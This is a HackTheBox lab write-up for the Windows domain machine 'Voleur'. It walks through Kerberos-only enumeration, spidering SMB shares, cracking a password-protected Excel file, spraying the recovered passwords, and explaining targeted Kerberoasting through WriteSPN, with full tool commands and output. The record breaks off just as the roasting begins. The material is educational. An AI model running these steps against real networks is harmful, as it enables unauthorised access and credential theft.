---
title: "HTB: Voleur"
date: 2026-06-29
draft: false
tags: ["Active Directory", "Windows", "HackTheBox", "Assumed Breach", "Kerberos", "NTLM Disabled", "Excel Password Cracking", "Kerberoasting", "Deleted User Restoration", "DPAPI", "Credential Recovery", "NTDS"]
categories: ["Writeups"]
description: "Voleur is involves a assumed-breach Active Directory enumeration, Kerberoasting, password protected document cracking, DPAPI credential recovery, deleted account restoration, SSH key extraction, and NTDS.dit analysis to obtain full domain administrator access."
---

# 🚩 Box Name: Voleur

## 📋 Initial Info
- **Hostname:** `voleur.htb`

Voleur is a medium-difficulty Windows machine that starts from an assumed breach scenario, meaning low-privileged domain credentials are already provided. The environment is Active Directory-based, with NTLM disabled, so Kerberos must be configured before enumeration can begin. During enumeration, a password-protected Excel spreadsheet is discovered on an SMB share. After extracting and cracking the document's password hash, the spreadsheet reveals information that leads to a targeted Kerberoasting attack against a service account. This provides credentials for remote access to the host. From there, a deleted domain user is restored, allowing recovery of DPAPI-protected credentials that expose a higher-privileged account. Those credentials lead to an SSH private key for a backup service account, providing access to a Linux subsystem. Finally, backup copies of the NTDS.dit, SYSTEM, and SECURITY files are extracted to recover the Administrator NTLM hash and gain full domain administrator access.

As is common in real life Windows pentests, you will start the Voleur box with credentials for the following account: ryan.naylor / HollowOct31Nyt

---

## 🔍 Reconnaissance

### 📡 Port Scanning (Nmap)
> [!TIP] Scan Command
> `sudo nmap -A -T4 -p- -oN nmap/initial <IP>`

As always, I start with a full TCP port scan to get a feel for what I'm was dealing with.

#### Monster Scan
```shell
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-29 10:09 CDT
Nmap scan report for 10.129.24.74
Host is up (0.060s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-06-29 23:10:38Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
2222/tcp  open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 42:40:39:30:d6:fc:44:95:37:e1:9b:88:0b:a2:d7:71 (RSA)
|   256 ae:d9:c2:b8:7d:65:6f:58:c8:f4:ae:4f:e4:e8:cd:94 (ECDSA)
|_  256 53:ad:6b:6c:ca:ae:1b:40:44:71:52:95:29:b1:bb:c1 (ED25519)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
51451/tcp open  msrpc         Microsoft Windows RPC
51473/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: 7h59m58s
| smb2-time:
|   date: 2026-06-29T23:11:33
|_  start_date: N/A

TRACEROUTE (using port 135/tcp)
HOP RTT      ADDRESS
1   58.82 ms 10.10.14.1
2   59.54 ms 10.129.24.74

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 190.44 seconds
```


This is an Active Directory Domain Controller several ports immediately give that away. Nothing too surprising there. One port, however, sticks out immediately.

### 🔐 Investigating SSH

`2222/tcp open ssh OpenSSH 8.2p1 Ubuntu` 

SSH on a Windows Domain Controller is unusual. Even stranger, the banner identifies it as an Ubuntu SSH server. Either someone installed OpenSSH on Windows and customized it, there's a Linux system forwarding connections, or another host is involved behind the scenes. Whatever the explanation, it definitely deserves a closer look.

Another interesting detail in the Nmap output.

```text
Service Info: Host: DC; OSs: Windows, Linux
```


Seeing both Windows and Linux fingerprints reinforces the idea that there may be more going on here than a standard Domain Controller. The OpenSSH service on port **2222** is too interesting to ignore. Since I already have the low-privileged credentials provided by Hack The Box, I tried logging in.

```shell
┌─[split@parrot:~/Documents/HTB/Voleur]
└─❯ ssh ryan.naylor@voleur.htb -p 2222                                  130 ↵ ──(Mon,Jun29)─┘
The authenticity of host '[voleur.htb]:2222 ([10.129.24.74]:2222)' can't be established.
ED25519 key fingerprint is SHA256:mKWAEwLTnEN2bJNi7fkc+BZodiXCIiP3ywSLJiZL0ss.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[voleur.htb]:2222' (ED25519) to the list of known hosts.
ryan.naylor@voleur.htb: Permission denied (publickey).
```


Instead of prompting for a password, SSH immediately responded with `Permission denied`. No luck remoting in with SSH. That tells me password authentication is disabled and only public key authentication is allowed. Unfortunately, without Ryan's private SSH key, this path is a dead end for now. Still, it's worth keeping in the back of my mind. Random services that don't seem useful early on often become very useful later after I've collected additional credentials or files.

### 🌐 DNS Enumeration


Since DNS is running on the target, it's worth enumerating.

```shell
┌─[split@parrot:~/Documents/HTB]
└─❯ dig any voleur.htb @10.129.24.74                                           ──(Mon,Jun29)─┘

; <<>> DiG 9.20.23-1~deb13u1-Debian <<>> any voleur.htb @10.129.24.74
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 38141
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 6, AUTHORITY: 0, ADDITIONAL: 2

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;voleur.htb.                    IN      ANY

;; ANSWER SECTION:
voleur.htb.             600     IN      A       10.129.24.74
voleur.htb.             600     IN      A       10.129.232.53
voleur.htb.             600     IN      A       10.129.232.130
voleur.htb.             600     IN      A       10.10.11.76
voleur.htb.             3600    IN      NS      dc.voleur.htb.
voleur.htb.             3600    IN      SOA     dc.voleur.htb. hostmaster.voleur.htb. 168 900 600 86400 3600

;; ADDITIONAL SECTION:
dc.voleur.htb.          1200    IN      A       10.129.24.74

;; Query time: 59 msec
;; SERVER: 10.129.24.74#53(10.129.24.74) (TCP)
;; WHEN: Mon Jun 29 10:16:56 CDT 2026
;; MSG SIZE  rcvd: 183
```


The response confirmed several useful pieces of information. It identified the authoritative name server for the domain and resolved the Domain Controller.

Knowing the Domain Controller's hostname becomes important later when working with Kerberos. Unlike NTLM, Kerberos is very particular about hostnames and Service Principal Names (SPNs). Using the wrong hostname can cause authentication to fail even when your credentials are perfectly valid.

To avoid future headaches, I added both names to my `/etc/hosts` file.


### 🩸BloodHound Data Collection

Rather than blindly poking around the domain, I wanted to get a high-level view of the Active Directory environment.

For that, I used **RustHound-CE**, a fast BloodHound data collector written in Rust.

```shell
┌─[split@parrot:~/Documents/HTB/Voleur/Bloodhound_Data]
└─❯ rusthound-ce -d voleur.htb -i 10.129.24.74 -u ryan.naylor -p 'HollowOct31Nyt' -v                                                                                          ──(Mon,Jun29)─┘
---------------------------------------------------
Initializing RustHound-CE at 10:25:24 on 06/29/26
Powered by @g0h4n_0
---------------------------------------------------

[2026-06-29T15:25:24Z INFO  rusthound_ce] Verbosity level: Debug
<SNIP>
[2026-06-29T15:25:31Z INFO  rusthound_ce::json::maker::common] .//20260629102531_voleur-htb_containers.json created!

RustHound-CE Enumeration Completed at 10:25:31 on 06/29/26! Happy Graphing!
```


After a few seconds, RustHound finished collecting the domain information and generated the BloodHound JSON files.

```shell
┌─[split@parrot:~/Documents/HTB/Voleur/Bloodhound_Data]
└─❯ ls                                                          ──(Mon,Jun29)─┘
20260629102531_voleur-htb_computers.json   20260629102531_voleur-htb_domains.json  20260629102531_voleur-htb_groups.json  20260629102531_voleur-htb_users.json
20260629102531_voleur-htb_containers.json  20260629102531_voleur-htb_gpos.json     20260629102531_voleur-htb_ous.json
```


I imported the data into BloodHound and started exploring the graph. The first thing I checked was Ryan's account.

Ryan belongs to the **First-Line Technicians** group. Unfortunately, from an attacker's perspective, it isn't particularly exciting. The group didn't appear to have any obvious privileged rights, dangerous ACLs, or direct paths to Domain Admin.

![R.Naylor BloodHound](/images/voleur/r.naylorBH.png)

Since nothing immediately jumps out at me, I made a mental note to revisit BloodHound later if I got stuck. For now, I decided to pivot towards SMB enumeration.

### 🌐 SMB Enumeration

The first thing I did after the initial recon is enumerate SMB. Since I already have valid domain credentials (`ryan.naylor:HollowOct31Nyt`), this should have been straightforward or so I thought. I started with NetExec.

Instead of authenticating, NetExec came back with `STATUS_NOT_SUPPORTED` which confirms NTLM is not supported.

```shell
┌─[split@parrot:~/Documents/HTB/Voleur]
└─❯ nxc smb voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt'                                                                                                                   ──(Mon,Jun29)─┘
SMB         10.129.24.74    445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         10.129.24.74    445    DC               [-] voleur.htb\ryan.naylor:HollowOct31Nyt STATUS_NOT_SUPPORTED
```

Looking closer at the banner revleals `NTLM: False`.

The domain has NTLM authentication disabled, meaning traditional username/password authentication over SMB isn't allowed. Authentication must be performed with Kerberos instead. That's becoming more common in modern Active Directory environments and is generally a good security practice.

I told netexec to use Kerberose instead by addin the -k flag.

```shell
┌─[split@parrot:~/Documents/HTB/Voleur]
└─❯ nxc smb voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -k                                                                                                                ──(Mon,Jun29)─┘
SMB         voleur.htb      445    voleur           [*]  x64 (name:voleur) (domain:htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         voleur.htb      445    voleur           [-] htb\ryan.naylor:HollowOct31Nyt [Errno Connection error (HTB:88)] [Errno -2] Name or service not known
```


Unfortunately, that didn't work either. After a little head scratching, I realized the problem wasn't my credentials it was the hostname.

Kerberos is very particular about Service Principal Names (SPNs). When connecting with Kerberos, you need to talk to the Domain Controller using the hostname that matches its registered SPN. Although `voleur.htb` resolved correctly, the actual Domain Controller is `dc.voleur.htb`.

```shell
┌─[split@parrot:~/Documents/HTB/Voleur]
└─❯ nxc smb dc.voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -k          1 ↵ ──(Mon,Jun29)─┘
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\ryan.naylor:HollowOct31Nyt
```

Success.

I could also request a legitimate Ticket Granting Ticket from the domain controller using ryan.naylor's credentials and the `getTGT.py` script.

### Requesting a Kerberos Ticket

I could also request a legitimate Ticket Granting Ticket from the domain controller using ryan.naylor's credentials and the `getTGT.py` script. So rather than supplying my password every time, I requested a Ticket Granting Ticket (TGT) using Impacket.

This generated a Kerberos credential cache:
```shell
┌─[split@parrot:~/Documents/HTB/Voleur]
└─❯ getTGT.py voleur.htb/ryan.naylor:'HollowOct31Nyt'                          ──(Mon,Jun29)─┘
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in ryan.naylor.ccache
```

I exported it so Linux would use it for Kerberos authentication:
```shell
┌─[split@parrot:~/Documents/HTB/Voleur]
└─❯ ls                                                                         ──(Mon,Jun29)─┘
Bloodhound_Data  kerbusers.txt  nmap  ryan.naylor.ccache
┌─[split@parrot:~/Documents/HTB/Voleur]
└─❯ export KRB5CCNAME=ryan.naylor.ccache                                       ──(Mon,Jun29)─┘
┌─[split@parrot:~/Documents/HTB/Voleur]
└─❯ klist                                                                      ──(Mon,Jun29)─┘
Ticket cache: FILE:ryan.naylor.ccache
Default principal: ryan.naylor@VOLEUR.HTB

Valid starting       Expires              Service principal
06/29/2026 19:13:14  06/30/2026 05:13:14  krbtgt/VOLEUR.HTB@VOLEUR.HTB
        renew until 06/30/2026 19:13:14
```

A quick `klist` confirms everything looks good.

### Why Isn't NetExec Using My Ticket?

It didn't initially work, I expected netexec to use my cached ticket but it didn't. I ran it in --debug mode and figured out what was wrong.

```shell
┌─[split@parrot:~/Documents/HTB/Voleur]
└─❯ nxc smb dc.voleur.htb -k                                                   ──(Mon,Jun29)─┘
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:None) (NTLM:False)
```


Buried in the debug output is the clue.

```shell
┌─[split@parrot:~/Documents/HTB/Voleur]
└─❯ nxc smb dc.voleur.htb -k --debug                                           ──(Mon,Jun29)─┘
[19:22:10] DEBUG    NXC VERSION: 1.5.1 - Yippie-Ki-Yay - 1.5.1-0parrot1 -         netexec.py:82
           DEBUG    PYTHON VERSION: 3.13.5 (main, Jun 25 2025, 18:55:22) [GCC     netexec.py:83
                    14.2.0]
           DEBUG    RUNNING ON: Linux Release: 7.0.9+parrot7-amd64                netexec.py:84
           DEBUG    Passed args: Namespace(version=False, threads=256,            netexec.py:85
                    timeout=None, jitter=None, no_progress=False, log=None,
                    verbose=False, debug=True, force_ipv6=False, dns_server=None,
                    dns_tcp=False, dns_timeout=3, protocol='smb',
                    target=['dc.voleur.htb'], username=[], password=[],
                    cred_id=[], ignore_pw_decoding=False, no_bruteforce=False,
                    continue_on_success=False, gfail_limit=None,
                    ufail_limit=None, fail_limit=None, kerberos=True,
                    use_kcache=False, 
 <SNIP>
           DEBUG    Closing connection to: dc.voleur.htb                      connection.py:189
```


The debug output is actually very helpful. The key line is in the parsed arguments.

```
kerberos=Trueuse_kcache=Falseusername=[]
```

Notice.

```
use_kcache=False
```


In NetExec version 1.5.1, the `-k` flag only enables Kerberos authentication. It does not automatically use my existing Kerberos ticket cache. Instead, I must explicitly tell NetExec to use the `.ccache` file.

The fix is simply:
```shell
┌─[split@parrot:~/Documents/HTB/Voleur]
└─❯ nxc smb dc.voleur.htb -k --use-kcache                                      ──(Mon,Jun29)─┘
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] VOLEUR.HTB\ryan.naylor from ccache
┌─[split@parrot:~/Documents/HTB/Voleur]
└─❯ nxc smb dc.voleur.htb --use-kcache                                         ──(Mon,Jun29)─┘
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] VOLEUR.HTB\ryan.naylor from ccache
```


Once I added `--use-kcache`, NetExec authenticated immediately. A small detail, but one that cost me far longer than I'd like to admit.


### Enumerating Users

With authentication sorted out, I started enumerating the domain.

```shell
┌─[split@parrot:~/Documents/HTB/Voleur]
└─❯ nxc smb dc.voleur.htb -u ryan.naylor -p 'HollowOct31Nyt' --use-kcache --users                                                                                         2 ↵ ──(Mon,Jun29)─┘
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] VOLEUR.HTB\ryan.naylor from ccache
SMB         dc.voleur.htb   445    dc               -Username-                    -Last PW Set-       -BadPW- -Description-
SMB         dc.voleur.htb   445    dc               Administrator                 2025-01-28 20:35:13 0       Built-in account for administering the computer/domain
SMB         dc.voleur.htb   445    dc               Guest                         <never>             0       Built-in account for guest access to the computer/domain
SMB         dc.voleur.htb   445    dc               krbtgt                        2025-01-29 08:43:06 0       Key Distribution Center Service Account
SMB         dc.voleur.htb   445    dc               ryan.naylor                   2025-01-29 09:26:46 0       First-Line Support Technician
SMB         dc.voleur.htb   445    dc               marie.bryant                  2025-01-29 09:21:07 0       First-Line Support Technician
SMB         dc.voleur.htb   445    dc               lacey.miller                  2025-01-29 09:20:10 0       Second-Line Support Technician
SMB         dc.voleur.htb   445    dc               svc_ldap                      2025-01-29 09:20:54 0
SMB         dc.voleur.htb   445    dc               svc_backup                    2025-01-29 09:20:36 0
SMB         dc.voleur.htb   445    dc               svc_iis                       2025-01-29 09:20:45 0
SMB         dc.voleur.htb   445    dc               jeremy.combs                  2025-01-29 15:10:32 0       Third-Line Support Technician
SMB         dc.voleur.htb   445    dc               svc_winrm                     2025-01-31 09:10:12 0
```


The output revealed several interesting accounts along with a handful of help desk users spread across different support tiers.

### Enumerating SMB Shares

Next I listed the available SMB shares.

```shell
┌─[split@parrot:~/Documents/HTB/Voleur]
└─❯ nxc smb dc.voleur.htb --use-kcache --shares                                                                                                                               ──(Mon,Jun29)─┘
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] VOLEUR.HTB\ryan.naylor from ccache
SMB         dc.voleur.htb   445    dc               [*] Enumerated shares
SMB         dc.voleur.htb   445    dc               Share           Permissions     Remark
SMB         dc.voleur.htb   445    dc               -----           -----------     ------
SMB         dc.voleur.htb   445    dc               ADMIN$                          Remote Admin
SMB         dc.voleur.htb   445    dc               C$                              Default share
SMB         dc.voleur.htb   445    dc               Finance
SMB         dc.voleur.htb   445    dc               HR
SMB         dc.voleur.htb   445    dc               IPC$            READ            Remote IPC
SMB         dc.voleur.htb   445    dc               IT              READ
SMB         dc.voleur.htb   445    dc               NETLOGON        READ            Logon server share
SMB         dc.voleur.htb   445    dc               SYSVOL          READ            Logon server share
```


The **IT** share sticks stood out. If there's one universal truth in Active Directory, it's that IT departments love leaving interesting files lying around.

### Spidering the Shares

Rather than manually browsing every directory, I let NetExec do the work.

```shell
┌─[split@parrot:~/Documents/HTB/Voleur]
└─❯ nxc smb dc.voleur.htb --use-kcache -M spider_plus                                                                                                                         ──(Mon,Jun29)─┘
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] VOLEUR.HTB\ryan.naylor from ccache
SPIDER_PLUS dc.voleur.htb   445    dc               [*] Started module spidering_plus with the following options:
SPIDER_PLUS dc.voleur.htb   445    dc               [*]  DOWNLOAD_FLAG: False
SPIDER_PLUS dc.voleur.htb   445    dc               [*]     STATS_FLAG: True
SPIDER_PLUS dc.voleur.htb   445    dc               [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS dc.voleur.htb   445    dc               [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS dc.voleur.htb   445    dc               [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS dc.voleur.htb   445    dc               [*]  OUTPUT_FOLDER: /home/split/.nxc/modules/nxc_spider_plus
SMB         dc.voleur.htb   445    dc               [*] Enumerated shares
SMB         dc.voleur.htb   445    dc               Share           Permissions     Remark
SMB         dc.voleur.htb   445    dc               -----           -----------     ------
SMB         dc.voleur.htb   445    dc               ADMIN$                          Remote Admin
SMB         dc.voleur.htb   445    dc               C$                              Default share
SMB         dc.voleur.htb   445    dc               Finance
SMB         dc.voleur.htb   445    dc               HR
SMB         dc.voleur.htb   445    dc               IPC$            READ            Remote IPC
SMB         dc.voleur.htb   445    dc               IT              READ
SMB         dc.voleur.htb   445    dc               NETLOGON        READ            Logon server share
SMB         dc.voleur.htb   445    dc               SYSVOL          READ            Logon server share
SPIDER_PLUS dc.voleur.htb   445    dc               [+] Saved share-file metadata to "/home/split/.nxc/modules/nxc_spider_plus/dc.voleur.htb.json".
SPIDER_PLUS dc.voleur.htb   445    dc               [*] SMB Shares:           8 (ADMIN$, C$, Finance, HR, IPC$, IT, NETLOGON, SYSVOL)
SPIDER_PLUS dc.voleur.htb   445    dc               [*] SMB Readable Shares:  4 (IPC$, IT, NETLOGON, SYSVOL)
SPIDER_PLUS dc.voleur.htb   445    dc               [*] SMB Filtered Shares:  1
SPIDER_PLUS dc.voleur.htb   445    dc               [*] Total folders found:  27
SPIDER_PLUS dc.voleur.htb   445    dc               [*] Total files found:    7
SPIDER_PLUS dc.voleur.htb   445    dc               [*] File size average:    3.55 KB
SPIDER_PLUS dc.voleur.htb   445    dc               [*] File size min:        22 B
SPIDER_PLUS dc.voleur.htb   445    dc               [*] File size max:        16.5 KB
```


The `spider_plus` module recursively crawls every readable share and builds an inventory of accessible files without downloading everything. It's a great way to quickly identify documents worth investigating.

The report shows only a handful of accessible files, but one immediately catches my attention.

```shell
┌─[split@parrot:~/Documents/HTB/Voleur]
└─❯ cat /home/split/.nxc/modules/nxc_spider_plus/dc.voleur.htb.json                                                                                                           ──(Mon,Jun29)─┘
{
    "IT": {
        "First-Line Support/Access_Review.xlsx": {
            "atime_epoch": "2025-01-31 03:09:27",
            "ctime_epoch": "2025-01-29 03:39:51",
            "mtime_epoch": "2025-05-29 17:23:36",
            "size": "16.5 KB"
        }
    },
```

An Excel spreadsheet named **Access_Review.xlsx** sitting in the IT share?

I downloaded it with:
```shell
┌─[split@parrot:~/Documents/HTB/Voleur]
└─❯ nxc smb dc.voleur.htb --use-kcache --share IT --get-file "/First-Line Support/Access_Review.xlsx" ~/Documents/HTB/Voleur/Access_Review.xlsx                               ──(Mon,Jun29)─┘
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] VOLEUR.HTB\ryan.naylor from ccache
SMB         dc.voleur.htb   445    dc               [*] Copying "/First-Line Support/Access_Review.xlsx" to "/home/split/Documents/HTB/Voleur/Access_Review.xlsx"
SMB         dc.voleur.htb   445    dc               [+] File "/First-Line Support/Access_Review.xlsx" was downloaded to "/home/split/Documents/HTB/Voleur/Access_Review.xlsx"
```


Since it's an Office document, I found it easier to open it on my Windows host using Microsoft Excel instead of LibreOffice.

Unfortunately, Excel greeted me with another obstacle `Access_Review.xlsx is password protected.`


![Password Protected Excel](/images/voleur/excelPWProtected.png)



---

## ⚡ Exploitation (Initial Access)


### Cracking the SpreadSheet

Finding the password-protected Excel spreadsheet is encouraging, but now I need to open it.

Fortunately, John the Ripper includes a utility that extracts password hashes from Microsoft Office documents.

First, I extracted the hash:
```shell
┌─[split@parrot:~/Documents/HTB/Voleur]
└─❯ office2john Access_Review.xlsx                                                                                                                                            ──(Mon,Jun29)─┘
Access_Review.xlsx:$office$*2013*100000*256*16*a80811402788c037b50df976864b33f5*500bd7e833dffaa28772a49e987be35b*7ec993c47ef39a61e86f8273536decc7d525691345004092482f9fd59cfa111c
```


This produced an Office 2013 hash, which I saved into a separate file.

Within a few seconds, John found it:
```shell
┌─[split@parrot:~/Documents/HTB/Voleur]
└─❯ sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash                                                                                                            1 ↵ ──(Mon,Jun29)─┘
Using default input encoding: UTF-8
Loaded 1 password hash (Office, 2007/2010/2013 [SHA1 256/256 AVX2 8x / SHA512 256/256 AVX2 4x AES])
Cost 1 (MS Office version) is 2013 for all loaded hashes
Cost 2 (iteration count) is 100000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
football1        (Access_Review.xlsx)
1g 0:00:00:04 DONE (2026-06-29 20:26) 0.2444g/s 191.6p/s 191.6c/s 191.6C/s football1..lolita
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Cracked!
`football1`

After opening the spreadsheet, things immediately get much more interesting. The document is practically an information leak disguised as an HR spreadsheet. Several rows contain usernames, passwords, group memberships, and comments from administrators. 

![Cracked Excel](/images/voleur/crackedexcel.png)


Something that immediately sticks out is the comment next to the user `Todd.Wolfe`. It says:

"Leaver. Password was reset to NightT1meP1dg3on14 and account deleted."

This feels like a pretty strong hint. If I can get a shell and obtain the necessary permissions, this account is definitely worth restoring and enumerating.

Another thing that catches my attention is that several users are members of the **Remote Management Users** group, meaning they should be able to log in remotely via WinRM.

There's also a note next to the **`svc_winrm`** service account that reads:

"Need to ask Lacey as she reset this recently."

That makes me wonder if the password listed in the spreadsheet is still valid.

I take all of the usernames and passwords I collect from the spreadsheet and create separate `users` and `passwords` files. With those ready to go, it's time to perform a password spray and see if any of the newly discovered credentials still work.


### Password Spraying

Since NTLM is disabled in this environment, I made sure to authenticate with Kerberos. Don't make the same mistake I did. The first time I forgot the `-k` flag and spent a minute wondering why nothing worked before reading the error message more carefully. Lesson learned.

I started by spraying against LDAP.

```shell
┌─[split@parrot:~/Documents/HTB/Voleur]
└─❯ nxc ldap dc.voleur.htb -u users -p 'passwords' -k                                                                                                                         ──(Mon,Jun29)─┘
LDAP        dc.voleur.htb   389    DC               [*] None (name:DC) (domain:voleur.htb) (signing:None) (channel binding:No TLS cert) (NTLM:False)
LDAP        dc.voleur.htb   389    DC               [-] voleur.htb\Administrator:HollowOct31Nyt KDC_ERR_PREAUTH_FAILED
LDAP        dc.voleur.htb   389    DC               [-] voleur.htb\Guest:HollowOct31Nyt KDC_ERR_CLIENT_REVOKED
LDAP        dc.voleur.htb   389    DC               [-] voleur.htb\krbtgt:HollowOct31Nyt KDC_ERR_CLIENT_REVOKED
LDAP        dc.voleur.htb   389    DC               [+] voleur.htb\ryan.naylor:HollowOct31Nyt
```


I forgot to add the `--continue-on-success` flag so it stopped after `ryan.naylor`

```shell
┌─[split@parrot:~/Documents/HTB/Voleur]
└─❯ nxc smb dc.voleur.htb -u users -p 'passwords' -k --continue-on-success                                                                                                    ──(Mon,Jun29)─┘
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\Administrator:HollowOct31Nyt KDC_ERR_PREAUTH_FAILED
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\Guest:HollowOct31Nyt KDC_ERR_CLIENT_REVOKED
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\krbtgt:HollowOct31Nyt KDC_ERR_CLIENT_REVOKED
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\ryan.naylor:HollowOct31Nyt
SMB         dc.voleur.htb   445    dc               [-] 
<SNIP>
voleur.htb\lacey.miller:M1XyC9pW7qT5Vn KDC_ERR_PREAUTH_FAILED
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\svc_ldap:M1XyC9pW7qT5Vn
SMB         dc.voleur.htb   445    dc               [-]             [-] voleur.htb\svc_backup:N5pXyW1VqM7CZ8 KDC_ERR_PREAUTH_FAILED
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\svc_iis:N5pXyW1VqM7CZ8
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\jeremy.combs:N5pXyW1VqM7CZ8 KDC_ERR_PREAUTH_FAILED
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\svc_winrm:N5pXyW1VqM7CZ8 KDC_ERR_PREAUTH_FAILED
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\todd.wolfe:N5pXyW1VqM7CZ8 KDC_ERR_C_PRINCIPAL_UNKNOWN
```

Two additional credential pairs worked!

More Credentials:
- `svc_ldap:M1XyC9pW7qT5Vn`
and
- `svc_iis:N5pXyW1VqM7CZ8`

So these were correct from the excel file. I still don't have remote access but I now have access to 2 more users. Time to see what BloodHound will find with these two new users.

### BloodHound Revisited

The `svc_iis` service account is not very interesting. However the `svc_ldap` account is very promising.

![svc_ldap BloddHound](/images/voleur/svc_ldap.png)


BloodHound highlighted two very interesting relationships.

- The `svc_ldap` object has `WriteSPN` privileges over the `svc_winrm` account. This is our ticket in since this account has remote access rights!
- The `svc_ldap` object is a `MemberOf` the `RESTORE_USERS` group. The second relationship immediately reminds me of Todd Wolfe's deleted account.

The **WriteSPN** privilege is what really catches my attention since I still don't have a shell.

At this point from looking at my DACLs enumeration notes I'm thinking I can do a Targeted Kerberoasting attack on the user `svc_winrm` and then try to crack the password.


### Understanding WriteSPN

Every Active Directory service that uses Kerberos registers one or more Service Principal Names (SPNs). An SPN tells the Key Distribution Center (KDC):

"This account is allowed to provide this particular service."

When a client requests access to a service, the KDC encrypts a service ticket using the password hash of the account that owns the SPN. Normally, only administrators can modify these SPNs. However, if you have the **WriteSPN** privilege over another account, you can add a fake SPN to that account yourself.

Why is that useful? Because once the account has an SPN, you can request a Kerberos service ticket for it. The ticket is encrypted using that user's password hash. You now have something you can take offline and crack with Hashcat. This technique is known as **Targeted Kerberoasting**.

Unlike traditional Kerberoasting, which only works against accounts that already have SPNs assigned, Targeted Kerberoasting lets you temporarily assign one yourself as long as you have **WriteSPN** rights.

Since BloodHound also showed that **svc_winrm** had Remote Management privileges, recovering its password would likely give me my initial shell.

Time to roast.

#### Targeted Kerberoasting

First few attempts didn't work the tool failed with authentication errors. I'm going to create a Ticket Granting Ticket first with `getTGT.py` to see if I can authenticate this way.

```shell
